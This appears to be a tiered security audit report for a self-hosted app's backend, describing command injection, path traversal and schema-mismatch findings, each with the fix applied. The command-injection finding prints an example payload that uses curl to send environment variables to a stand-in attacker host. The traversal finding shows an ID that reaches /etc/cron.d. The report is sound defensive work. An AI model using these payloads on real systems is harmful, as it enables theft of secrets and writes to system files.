# PrivateNexus — Tier 14 Security Assessment Report
**Date:** 24 June 2026
**Scope:** Supporting modules — `fileApply.js`, `drafts.js`, `db.js` (schema audit), `auditLog.js`, `fileBackups.js`, `fileKnownGood.js`, `backupLabels.js`, `backupRetention.js`, `restorePlanner.js`, `restoreTargeting.js`, `restoreRollbackAdvice.js`, `restoreLog.js`; middleware — `requireAuth.js`, `requireRole.js`
**Tester:** JARVIS / Claude Code (assisted, operator-supervised)
**Branch assessed:** `main` @ `559ba28`

---

## Executive Summary

Tier 14 audited the supporting modules that underpin the application's file management, backup, restore, and database layers. The middleware (`requireAuth`, `requireRole`) was found correct. The restore and backup modules (`fileBackups.js`, `backupRetention.js`, `fileKnownGood.js`, `backupLabels.js`, `restorePlanner.js`, `restoreTargeting.js`, `restoreRollbackAdvice.js`, `restoreLog.js`) were found clean — they all use validated filenames and atomic write patterns.

Two MEDIUM findings were identified in `fileApply.js` and `drafts.js`: shell command injection via string interpolation with `shell: true`, and path traversal via an unvalidated draft ID passed to `path.join`. A LOW finding covered a schema-code mismatch pair introduced during the earlier tier fixes — `restore_tests.test_type` had a DB CHECK constraint that excluded `'tabletop'` (causing a DB error on input that passed app-level validation), and `service_dependencies.dep_type` code only allowed a subset of what the schema permitted. Both schema constraints were migrated in `db.js` `initDb()`.

**4 findings were identified. All 4 were fixed in commit `559ba28`.**

---

## Findings Summary

| ID    | Title                                                                                     | Severity | Status |
|-------|-------------------------------------------------------------------------------------------|----------|--------|
| T14-1 | `fileApply.js` — `shell: true` with string-interpolated `applyPath` — command injection   | MEDIUM   | Fixed  |
| T14-2 | `drafts.js` — no safe-path validation on draft ID passed to `path.join`                   | MEDIUM   | Fixed  |
| T14-3 | `db.js` schema — `restore_tests.test_type` CHECK excludes `'tabletop'`; DB error on valid input | LOW | Fixed  |
| T14-4 | `db.js` schema — `service_dependencies.dep_type` CHECK includes values T12-1 code rejects | LOW     | Fixed  |

---

## Detailed Findings

---

### T14-1 — `fileApply.js` — `shell: true` with string-interpolated `applyPath`
**Severity:** MEDIUM
**Component:** `app/backend/src/fileApply.js`

**Description:**
`fileApply.js` dispatches to two apply strategies, both constructing shell commands by string interpolation with `shell: true`:

```javascript
// Before fix
"compose-up": (applyPath) => {
  const dir = path.dirname(applyPath);
  return run(`docker compose -f "${applyPath}" up -d`, { cwd: dir, timeout: 90000 });
},
"caddy-reload": (applyPath) => {
  return run(`caddy reload --config "${applyPath}"`, { timeout: 30000 });
},

function run(cmd, opts = {}) {
  const result = spawnSync(cmd, [], { shell: true, ... });  // shell: true
```

The `applyPath` is wrapped in double quotes but not escaped. If `applyPath` contains a `"` character, the quoted string is terminated early and arbitrary shell commands follow:

```
applyPath = '/opt/stacks/foo"; curl http://attacker.com/exfil -d "$(env)"  #'
→ docker compose -f "/opt/stacks/foo"; curl http://attacker.com/exfil -d "$(env)"  #" up -d
```

**Attack path:** An admin registers a file entry via `POST /api/files/register` with `applyPath` containing shell metacharacters. When `POST /api/files/apply` is subsequently called for that file, the crafted `applyPath` executes arbitrary commands in the backend container (running as UID 1000, with the Docker socket proxy accessible).

**Context:** Exploitation requires admin-level access and a deliberate malicious registration. However, the principle of least surprise demands that `applyPath` — which comes from persistent admin-controlled data — cannot escalate to arbitrary command execution even if admin credentials are compromised.

**Fix:** Rewrote `fileApply.js` to use `spawnSync` with a discrete args array and `shell: false`:

```javascript
// After fix
const HANDLERS = {
  "compose-up": (applyPath) => {
    const dir = path.dirname(applyPath);
    return run(["docker", "compose", "-f", applyPath, "up", "-d"], { cwd: dir, timeout: 90000 });
  },
  "caddy-reload": (applyPath) => {
    return run(["caddy", "reload", "--config", applyPath], { timeout: 30000 });
  },
};

function run(argv, opts = {}) {
  const [cmd, ...args] = argv;
  const result = spawnSync(cmd, args, { shell: false, encoding: "utf8", timeout, cwd });
```

With `shell: false`, `applyPath` is passed directly to the kernel `execve` syscall as a discrete argument. No shell interpretation occurs regardless of content.

---

### T14-2 — `drafts.js` — path traversal via unsanitised draft ID
**Severity:** MEDIUM
**Component:** `app/backend/src/drafts.js`

**Description:**
All three exported functions (`hasDraft`, `readDraft`, `writeDraft`) derive the draft file path by appending the draft ID to `DRAFTS_DIR`:

```javascript
// Before fix
const DRAFTS_DIR = "/root/privatenexus/app/backend/data/drafts";

function getDraftPath(id) {
  return path.join(DRAFTS_DIR, `${id}.draft`);
}
```

`path.join` normalises `..` sequences. If `id` contains traversal sequences, the resolved path can escape `DRAFTS_DIR`:

```
id = "../../../../../../etc/cron.d/evil"
getDraftPath(id) → path.join(DRAFTS_DIR, "../../../../../../etc/cron.d/evil.draft")
               → "/etc/cron.d/evil.draft"
```

`writeDraft(id, content)` would then write attacker-controlled content to `/etc/cron.d/evil.draft`. The `.draft` suffix prevents direct execution as a cron job, but:
- Sufficient `../` sequences can reach directories where `.draft` files have meaning to other processes
- `readDraft(id)` could exfiltrate any `*.draft` file on the filesystem
- Future changes that strip the suffix (e.g., a rename step) would turn this into full arbitrary write

**Attack path:** An admin registers a file entry with `id` containing `..` sequences (e.g., `../../etc/hosts`). `filesRegistry.js` accepts arbitrary IDs at registration time with no slug validation. When any user with operator access calls `POST /api/files/draft` with that file ID, `writeDraft` writes to the traversed path.

**Fix:** Added `assertSafeId` called at the top of all three exported functions:

```javascript
function assertSafeId(id) {
  if (typeof id !== "string" || !/^[a-zA-Z0-9_-]{1,128}$/.test(id)) {
    throw new Error(`Invalid draft ID: "${id}"`);
  }
}

export function hasDraft(id)    { assertSafeId(id); ... }
export function readDraft(id)   { assertSafeId(id); ... }
export function writeDraft(id, content) { assertSafeId(id); ... }
```

The regex allows the slug format used by all current DEFAULTS IDs (e.g., `privatenexus-compose`) and caps length at 128. `..`, `/`, `\`, null bytes, and space characters are all rejected.

---

### T14-3 — `db.js` schema — `restore_tests.test_type` CHECK constraint excludes `'tabletop'`
**Severity:** LOW
**Component:** `app/backend/src/db.js`, `app/backend/src/routes/recovery.js`

**Description:**
The `restore_tests` table was created with:
```sql
test_type TEXT NOT NULL DEFAULT 'dry_run'
  CHECK (test_type IN ('dry_run', 'partial', 'full'))
```

The T12-5 fix added `'tabletop'` to the application-level `VALID_TEST_TYPES` array:
```javascript
const VALID_TEST_TYPES = ["dry_run", "partial", "full", "tabletop"];
```

This created a silent bug: a request with `test_type: 'tabletop'` passes application validation but then triggers a PostgreSQL constraint violation. The route's global error handler returns a sanitised 500 to the client. The request appears to succeed (HTTP 200 at the validation stage) then fails silently from the DB perspective.

**Fix:** Added an idempotent migration to `initDb()` in `db.js`:

```javascript
await pool.query(
  `ALTER TABLE restore_tests DROP CONSTRAINT IF EXISTS restore_tests_test_type_check`
);
await pool.query(
  `ALTER TABLE restore_tests ADD CONSTRAINT restore_tests_test_type_check
     CHECK (test_type IN ('dry_run', 'partial', 'full', 'tabletop'))`
);
```

Running `DROP CONSTRAINT IF EXISTS` is safe if the constraint was already updated; the subsequent ADD recreates it with the correct value set.

---

### T14-4 — `db.js` schema — `service_dependencies.dep_type` permits values T12-1 code rejects
**Severity:** LOW
**Component:** `app/backend/src/db.js`, `app/backend/src/routes/dependencies.js`

**Description:**
The `service_dependencies` table schema defines:
```sql
dep_type TEXT NOT NULL DEFAULT 'hard'
  CHECK (dep_type IN ('hard', 'soft', 'data', 'auth', 'network'))
```

The T12-1 fix set the application-level allowlist to only `["hard", "soft"]`. The values `'data'`, `'auth'`, and `'network'` are architecturally meaningful (data flow dependency, auth dependency, network dependency) and were clearly intended in the schema design, but were accidentally excluded from the T12-1 fix. The result: legitimate values accepted by the DB would be rejected at the application layer.

**Fix (two parts):**

1. Extend `VALID_DEP_TYPES` in `dependencies.js` to match the schema:
```javascript
const VALID_DEP_TYPES = ["hard", "soft", "data", "auth", "network"];
```

2. Add idempotent schema migration to `initDb()` to realign the DB constraint (ensuring it matches the now-corrected application list):
```javascript
await pool.query(
  `ALTER TABLE service_dependencies DROP CONSTRAINT IF EXISTS service_dependencies_dep_type_check`
);
await pool.query(
  `ALTER TABLE service_dependencies ADD CONSTRAINT service_dependencies_dep_type_check
     CHECK (dep_type IN ('hard', 'soft', 'data', 'auth', 'network'))`
);
```

---

## Supporting Modules — Clean Assessment

| Module | Lines | Assessment |
|--------|-------|------------|
| `requireAuth.js` | 3 | Clean — `req.session?.user` presence check only; correctly gates all `/api/*` routes |
| `requireRole.js` | 19 | Clean — `Math.max(...roles.map(...).filter(l => l >= 0), -1)` correctly floors to -1 for empty/unknown role arrays; MCP token only grants operator |
| `auditLog.js` | 18 | Clean — parameterised INSERT; fire-and-forget is intentional (non-blocking); `.catch()` logs failures; detail is JSON.stringified before passing to query |
| `fileBackups.js` | 55 | Clean — `readBackup` validates no path separators and `.bak` suffix; `startsWith(BACKUPS_DIR)` guard; atomic backup naming via `id__timestamp__basename.bak` |
| `fileKnownGood.js` | 38 | Clean — atomic write via tmp+rename; `fileId` key from internal code only |
| `backupLabels.js` | 48 | Clean — label trimmed and capped at 64 chars; atomic write; keys are backup filenames, not user-controlled paths |
| `backupRetention.js` | 48 | Clean — `executeDeleteCandidates` validates no path separators and `startsWith(BACKUPS_DIR)` before `unlinkSync` |
| `restorePlanner.js` | 75 | Clean — read-only; `backupFileName` checked for `${fileId}__` prefix and `.bak` suffix before use |
| `restoreTargeting.js` | 23 | Clean — `validateTargetPath` uses `path.resolve` for both paths then compares directories; correctly prevents escape from live file's directory |
| `restoreRollbackAdvice.js` | 30 | Clean — pure computation from registry and backup list data; no external input reaches filesystem |
| `restoreLog.js` | 50 | Clean — atomic write via tmp+rename; `MAX_ENTRIES = 200` cap enforced; entries are internal struct, no user-controlled keys |

### PostgreSQL schema — additional observations

- **No Row-Level Security (RLS):** All tenant isolation relies on application-level `WHERE tenant_id = $1`. This is accepted in the current single-tenant deployment. For the multi-tenant commercialisation path (PN-2+), RLS policies should be added as a migration — any table missing a `WHERE tenant_id` clause at the query level is a silent data-leakage risk.
- **`audit_log.tenant_id` is nullable:** The column lacks a `NOT NULL` constraint. Records can be written without a tenant ID (e.g., during early startup or for system-generated events). Acceptable in the current deployment.
- **No `ON CONFLICT` on idempotent seed INSERTs:** All seeding uses `ON CONFLICT DO NOTHING` — correct.

---

## Remediation Summary

All 4 findings fixed in commit `559ba28` on `git.securenexus.net/tristian/privatenexus`:

| Finding | File(s) | Change |
|---------|---------|--------|
| T14-1 | `fileApply.js` | Full rewrite to `spawnSync(cmd, args, { shell: false })` with discrete args array |
| T14-2 | `drafts.js` | `assertSafeId()` regex guard added to all three exported functions |
| T14-3 | `db.js` | `initDb()` migration to DROP + ADD CHECK on `restore_tests.test_type` including `'tabletop'` |
| T14-4 | `db.js`, `dependencies.js` | `initDb()` migration to align `service_dependencies.dep_type` CHECK; `VALID_DEP_TYPES` extended to 5 values |

---

## Cumulative Tier Assessment

| Tier | Focus                                              | Findings | Fixed | Accepted |
|------|----------------------------------------------------|----------|-------|----------|
| 1–2  | RBAC, session integrity                            | —        | —     | —        |
| 3    | Injection, route auth, port exposure               | —        | —     | —        |
| 4    | Infrastructure exposure, container security        | 13       | 13    | 0        |
| 5    | Application logic, session, audit integrity        | 7        | 6     | 1        |
| 6    | Emergency ops safety, role completeness, input val | 6        | 6     | 0        |
| 7    | Audit trail integrity, workflow logic, validation  | 4        | 4     | 0        |
| 8    | File management, remaining routes, ESM compat      | 4        | 3     | 1        |
| 9    | Middleware, server config, dependencies            | 5        | 3     | 2        |
| 10   | Auth flow, file registry, health probes, compose   | 5        | 4     | 1        |
| 11   | DNS route, MCP server, utility routes              | 5        | 5     | 0        |
| 12   | Full route audit completion — actions, deps, intel | 5        | 5     | 0        |
| 13   | Missed routes, security headers, socket proxy      | 5        | 5     | 0        |
| 14   | Supporting modules, schema audit, middleware       | 4        | 4     | 0        |
| **Total** | **All tiers**                                | **63**   | **58**| **5**    |

**Accepted findings (cumulative — unchanged):**
- T5-5: Session fixation — mitigated by OIDC state/nonce + `sameSite: lax`
- T8-4: Docker labels expose compose paths — viewer-only, operator debugging use case
- T9-2: protobufjs/grpc-js — transitive via dockerode, not directly exploitable
- T9-5: Vite frontend CVEs — dev server only; nginx serves pre-built assets at runtime
- T10-4: Blind SSRF via `health_endpoint` — admin-only; no response body exfiltration

*Assessment performed on pn-test (VLAN 60 / 10.10.60.105). All findings relate to the PrivateNexus v2.0.0 stack in its development deployment.*
